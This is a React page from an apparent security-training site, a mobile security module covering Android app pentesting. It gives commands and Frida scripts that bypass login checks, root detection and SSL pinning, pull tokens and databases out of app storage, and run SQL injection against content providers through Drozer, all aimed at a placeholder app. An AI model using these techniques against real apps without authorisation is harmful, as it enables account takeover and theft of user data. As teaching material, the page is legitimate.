'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#7c4dff'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#4a3a6a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040208', border: `1px solid #200038`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#200038', marginRight: '8px' }}>//</span>{children}
  </h2>
)

export default function MobileSecurity() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#4a3a6a' }}>
        <Link href="/" style={{ color: '#4a3a6a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>MOBILE SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(124,77,255,0.08)`, border: `1px solid rgba(124,77,255,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/mobile-security/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a1030', borderRadius: '3px', color: '#4a3a6a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(124,77,255,0.35)` }}>MOBILE SECURITY</h1>
        <p style={{ color: '#4a3a6a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>Android APK analysis · Frida hooking · SSL unpinning · Drozer · MobSF · iOS security · ADB exploitation · OWASP Mobile Top 10</p>
      </div>

      <H2>01 — Android Architecture Attack Surface</H2>
      <Pre label="// WHERE ANDROID APPS ARE VULNERABLE">{`# APK structure (rename .apk to .zip to see):
# AndroidManifest.xml — permissions, components, exported activities
# classes.dex — compiled Java/Kotlin bytecode
# res/ — resources, layouts, sometimes hardcoded strings
# lib/ — native libraries (.so files)
# assets/ — raw files, sometimes config files with API keys

# Key attack areas:
# 1. Exported Activities — accessible without authentication
# 2. Hardcoded credentials in source/assets/strings.xml
# 3. Insecure data storage (cleartext files, SharedPreferences)
# 4. Insecure network communication (HTTP, no cert pinning)
# 5. Improper authentication checks (client-side)
# 6. Vulnerable WebView (JavaScript enabled, file access)
# 7. Broadcast receivers without permissions
# 8. Content providers with SQL injection`}</Pre>

      <H2>02 — Static Analysis</H2>
      <Pre label="// ANALYSE APK WITHOUT RUNNING IT">{`# Step 1: Decompile APK
# Install apktool:
sudo apt install apktool
apktool d target.apk -o target_decoded/

# Step 2: Decompile to Java with jadx
# Download: https://github.com/skylot/jadx
jadx target.apk -d target_java/
# Or GUI: jadx-gui target.apk

# Step 3: Look for secrets
grep -r "api_key\|apikey\|secret\|password\|token\|AWS\|AKIA" target_decoded/ 2>/dev/null
grep -r "http://" target_decoded/  # HTTP (not HTTPS)
grep -r "firebase\|amazonaws\|azure" target_decoded/

# Step 4: Check AndroidManifest.xml
cat target_decoded/AndroidManifest.xml
# Look for:
# android:exported="true" → accessible from other apps
# android:debuggable="true" → can attach debugger
# Dangerous permissions: READ_CONTACTS, RECORD_AUDIO, ACCESS_FINE_LOCATION

# Automated: MobSF (Mobile Security Framework)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
# Upload APK to http://localhost:8000
# Full automated analysis: secrets, permissions, code issues, network calls`}</Pre>

      <H2>03 — Dynamic Analysis with ADB</H2>
      <Pre label="// INTERACT WITH APP AT RUNTIME">{`# Android Debug Bridge — USB or WiFi connection to device
sudo apt install adb

# Connect (USB debugging must be enabled):
adb devices  # list connected devices

# Install APK:
adb install target.apk

# Launch activity directly (bypass auth screens):
adb shell am start -n com.target.app/.MainActivity
# Start exported activity:
adb shell am start -n com.target.app/.AdminActivity

# Send broadcast:
adb shell am broadcast -a com.target.ADMIN_ACTION

# View app logs in real-time:
adb logcat | grep -i "com.target.app"
# Look for: passwords, tokens, errors, API responses

# File system access (rooted device):
adb shell
# App's private storage:
ls /data/data/com.target.app/
# Databases:
sqlite3 /data/data/com.target.app/databases/main.db ".tables"
sqlite3 /data/data/com.target.app/databases/main.db "SELECT * FROM users;"
# SharedPreferences (often stores tokens):
cat /data/data/com.target.app/shared_prefs/*.xml

# Pull all app data:
adb backup -noapk com.target.app
# Convert backup: java -jar android-backup-extractor.jar backup.ab backup.tar`}</Pre>

      <H2>04 — Frida — Dynamic Instrumentation</H2>
      <Pre label="// HOOK FUNCTIONS AT RUNTIME — BYPASS ANYTHING">{`# Frida lets you inject JavaScript into running processes
# Hook any function → inspect/modify arguments and return values

# Install:
pip install frida-tools
# On Android device (rooted): install frida-server
# Download from releases.frida.re matching your device architecture

# Start frida-server on device:
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# List running processes:
frida-ps -U

# Hook a function with inline script:
frida -U com.target.app -e "Java.perform(function() {
  var MainActivity = Java.use('com.target.app.MainActivity');
  MainActivity.isLoggedIn.implementation = function() {
    console.log('[*] isLoggedIn() called — returning true');
    return true;  // Bypass auth check
  };
});"

# SSL Pinning bypass (most common task):
# Download: https://github.com/httptoolkit/frida-android-unpinning
frida -U com.target.app -l ./frida-android-unpinning.js

# Common bypass scripts:
# https://codeshare.frida.re - community scripts

# Bypass root detection:
frida -U com.target.app -e "
Java.perform(function() {
  var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
  RootBeer.isRooted.implementation = function() { return false; };
});"

# Log all crypto operations:
frida -U com.target.app -l crypto_logger.js  # See what's encrypted/decrypted`}</Pre>

      <H2>05 — SSL Pinning Bypass</H2>
      <Pre label="// INTERCEPT HTTPS TRAFFIC FROM MOBILE APPS">{`# Apps with SSL pinning validate the EXACT certificate
# Even if you install your Burp cert → SSL error
# Must bypass the pinning check

# Setup Burp Suite as proxy:
# Burp → Proxy → Options → Add listener → port 8080
# On Android WiFi → Proxy → 192.168.1.X:8080
# Install Burp cert: http://burpsuite (from device browser)

# Bypass methods:
# 1. Frida script (most reliable for modern apps):
frida -U com.target.app -l ssl-pinning-bypass.js
# Popular scripts: objection, httptoolkit unpinner

# 2. Objection (Frida wrapper with prebuilt bypasses):
pip install objection
objection -g com.target.app explore
# In objection shell:
android sslpinning disable

# 3. Patch APK (if no root):
# Decompile → find pinning code → remove → recompile → sign → install
apktool d target.apk
# Edit smali files to remove pinning
apktool b target_decoded/ -o patched.apk
# Sign:
java -jar uber-apk-signer.jar -a patched.apk

# 4. Android 7+ custom CA trust:
# Add network_security_config.xml:
echo '<network-security-config>
  <debug-overrides>
    <trust-anchors>
      <certificates src="user"/>
    </trust-anchors>
  </debug-overrides>
</network-security-config>' > network_security_config.xml
# Add to manifest: android:networkSecurityConfig="@xml/network_security_config"`}</Pre>

      <H2>06 — Drozer — Android Framework Testing</H2>
      <Pre label="// ATTACK ANDROID COMPONENTS SYSTEMATICALLY">{`# Drozer tests exported components comprehensively
# Install drozer agent on device, drozer on Kali

pip install drozer
# Install drozer-agent.apk on Android
adb install drozer-agent.apk
# Forward port:
adb forward tcp:31415 tcp:31415
# Connect:
drozer console connect

# In drozer console:
# List all packages:
run app.package.list

# Get package info:
run app.package.info -a com.target.app

# Find attack surface:
run app.package.attacksurface com.target.app

# Activities:
run app.activity.info -a com.target.app
# Start exported activity:
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Content Providers:
run app.provider.info -a com.target.app
# Query provider (SQLi testing):
run app.provider.query content://com.target.app.provider/users
# SQL injection:
run app.provider.query content://com.target.app.provider/users --selection "1=1--"

# Broadcast receivers:
run app.broadcast.info -a com.target.app
run app.broadcast.send --action com.target.ADMIN_ACTION`}</Pre>

      <H2>07 — OWASP Mobile Top 10</H2>
      <Pre label="// THE 10 MOST CRITICAL MOBILE VULNERABILITIES">{`# M1: Improper Credential Usage
# Hardcoded credentials in source code
# Weak encryption, credentials in URLs

# M2: Inadequate Supply Chain Security  
# Vulnerable third-party libraries
# Compromised SDK, malicious dependency

# M3: Insecure Authentication/Authorization
# Client-side auth checks (bypassed by Frida)
# Missing authentication on API endpoints
# Insecure session management

# M4: Insufficient Input/Output Validation
# SQLi in local database queries
# XSS in WebViews
# Path traversal in file operations

# M5: Insecure Communication
# HTTP instead of HTTPS
# No certificate validation
# Weak TLS configuration

# M6: Inadequate Privacy Controls
# Excessive permissions
# Sensitive data in logs
# Sensitive data in screenshots

# M7: Insufficient Binary Protections
# No root/jailbreak detection
# No obfuscation (easy reverse engineering)
# Debuggable in production

# M8: Security Misconfiguration
# Exported components without protection
# Debug logging in production
# Firebase with open access rules

# M9: Insecure Data Storage
# Sensitive data in SharedPreferences
# Unencrypted SQLite databases
# External storage misuse

# M10: Insufficient Cryptography
# Weak algorithms (MD5, SHA1, DES)
# Hardcoded keys
# ECB mode encryption (reveals patterns)`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #200038`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a3a6a' }}>← DASHBOARD</Link>
        <Link href="/modules/mobile-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(124,77,255,0.4)`, borderRadius: '4px', background: `rgba(124,77,255,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
